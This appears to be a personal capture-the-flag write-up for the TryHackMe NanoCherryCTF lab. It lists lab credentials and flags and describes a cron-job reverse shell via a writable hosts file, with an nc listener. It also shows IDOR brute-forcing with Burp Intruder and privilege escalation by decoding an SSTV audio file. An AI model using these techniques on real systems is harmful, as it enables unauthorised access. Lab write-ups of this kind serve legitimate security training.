> [!NOTE] Backdoor Creds
> User: notsus
> Pass:dontbeascriptkiddie
### Enumeration
```bash
Base32: 
chad-cherry: MNUGCZBAMNUGK4TSPEFAU===
molly-milk: NVXWY3DZFVWWS3DLBIFA====
bob-boba: MJXWELLCN5RGC===
sam-sprinkles: ONQW2LLTOBZGS3TLNRSXG===
```

#### Bob: chad3
Has a cron called `coinflip.sh`
Also writable `etc/hosts`
```bash
add entry for attack box
create rev shell on attack box in home/bob-boba/coinflip.sh

nc -lvnp 9001
```
`7h3fu7ur3`


#### Molly: Chad1
`nano.cherryontop.thm/users.db`
sqlitebrowser users.db
```python
puppet:master
```
Molly's Dashboard Flag: `THM{BL4CK_M4I1}`
chads-key1.txt: `n4n0ch3rry`


#### Sam: Chad2
IDOR user and sequence
Burp Intruder > ClusterBomb > `GET /content.php?facts=§4§&user=§I52WK43U§ HTTP/1.1`
Payload1 (facts)= 1-99
Payload2 (user)= Sam Sprinkle {base32}
`request 43`

```bash

ssh sam-sprinkles:SammyInMiami43
```
chads-key2.txt
`w1llb3`

#### Full flag

Combine flags for pass
`n4n0ch3rryw1llb37h3fu7ur3`
```bash
ssh chad-cherry@cherryontop.thm

chad-cherry@cherryontop.thm's password: n4n0ch3rryw1llb37h3fu7ur3

┌──(sstephens㉿kali-ppt)-[~/Documents/tryhackme/nanocherry]
└─$ ssh chad-cherry@cherryontop.thm  
chad-cherry@cherryontop.thm's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat Apr  8 10:44:17 2023 from 10.0.2.16
chad-cherry@nanocherryctf:~$ ls
Hello.txt  chad-flag.txt  rootPassword.wav
chad-cherry@nanocherryctf:~$ cat chad-flag.txt 
THM{P4SS3S_C0LL3CT3D}

```

#### Root
Pull the rootPassword.wav to attack box using `python -m http.server 9005`

It is a tv signal obfuscation - Need a new tool
```
git clone https://github.com/colaclanth/sstv 

cd sstv
python setup.py install
sstv -d rootPassword.wav -o results.jpg

open results.jpg in files
password to root

su root
```

**THM{YOU_NEVER_WERE_A_SCRIPT_KIDDIE} **



| Writeup Help       | Link                                                                      |
| ------------------ | ------------------------------------------------------------------------- |
| Sysrat (Root)      | https://thesysrat.com/blog/?p=840                                         |
| Kumarjit           | https://medium.com/@kumarjitdron69/nanocherryctf-writeup-thm-253d4389a68d |
| Burp(Samsprinkles) | https://squeakss.gitbook.io/ctfs/tryhackme/2024/nanocherryctf             |
